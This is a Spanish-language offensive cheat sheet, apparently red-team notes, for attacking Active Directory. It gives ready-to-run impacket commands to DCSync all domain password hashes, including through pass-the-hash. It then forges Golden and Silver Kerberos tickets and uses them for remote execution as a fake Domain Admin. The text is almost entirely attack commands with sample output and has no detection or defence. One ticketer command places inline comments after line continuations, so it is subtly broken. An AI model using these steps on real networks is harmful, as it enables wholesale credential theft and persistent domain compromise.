# DCSync — Volcado del NTDS.dit sin acceso físico al DC

DCSync simula el comportamiento de un Domain Controller legítimo
para solicitar la replicación de credenciales al DC real.

MITRE ATT&CK: T1003.006 — DCSync

---

## ¿Por qué funciona?

Los DC replican su base de datos entre sí usando el protocolo MS-DRSR.
Si una cuenta tiene el privilegio **DS-Replication-Get-Changes-All**,
puede solicitar esta replicación y obtener todos los hashes del dominio.

Cuentas con este privilegio por defecto:
- **Domain Admins**
- **Enterprise Admins**
- **Domain Controllers**

---

## Ejecutar DCSync

```bash
# Con impacket-secretsdump (desde Kali)
impacket-secretsdump empresa.local/Administrador:'Password123!'@192.168.1.10 \
    -just-dc-ntlm

# Output:
# krbtgt:502:aad3b435...:a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6:::  ← Para Golden Ticket
# Administrador:500:...:31d6cfe0d16ae931b73c59d7e0c089c0:::
# juan.garcia:1103:...:8f49f2e2b1d3e4a5b6c7d8e9f0a1b2c3:::

# Solo el hash del krbtgt (para Golden Ticket)
impacket-secretsdump empresa.local/Administrador:'Password123!'@192.168.1.10 \
    -just-dc-user krbtgt

# DCSync con Pass-the-Hash (si tienes el hash del DA)
impacket-secretsdump empresa.local/Administrador@192.168.1.10 \
    -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 \
    -just-dc-ntlm
```

---

## Golden Ticket (T1558.001)

Con el hash de **krbtgt** puedes crear tickets Kerberos falsos (Golden Tickets)
que te dan acceso como cualquier usuario, incluyendo Domain Admin, para siempre.

```bash
# 1. Obtener el hash de krbtgt (via DCSync o secretsdump)
# krbtgt:502:aad3b435...:a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6

# 2. Obtener el SID del dominio
impacket-getPac empresa.local/Administrador:'Password123!'@192.168.1.10

# 3. Crear Golden Ticket con impacket
impacket-ticketer \
    -nthash a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6 \  # Hash del krbtgt
    -domain-sid S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX \
    -domain empresa.local \
    -user "FalseAdmin" \
    -groups 512 \      # 512 = Domain Admins
    golden_ticket

# 4. Usar el Golden Ticket
export KRB5CCNAME=golden_ticket.ccache
impacket-psexec -k -no-pass empresa.local/FalseAdmin@dc01.empresa.local
```

---

## Silver Ticket (T1558.002)

Con el hash de una **cuenta de servicio** puedes crear tickets para ese servicio específico.
Más sigiloso que el Golden Ticket — no contacta al DC.

```bash
# 1. Obtener hash de la cuenta de servicio (ej: svc-sql)
# (via Kerberoasting o secretsdump)

# 2. Crear Silver Ticket para el servicio SQL
impacket-ticketer \
    -nthash HASH_SVC_SQL \
    -domain-sid S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX \
    -domain empresa.local \
    -spn MSSQLSvc/db01.empresa.local:1433 \
    -user "Administrador" \
    silver_ticket_sql

# 3. Usar el Silver Ticket
export KRB5CCNAME=silver_ticket_sql.ccache
# Conectar al SQL Server sin contraseña
```
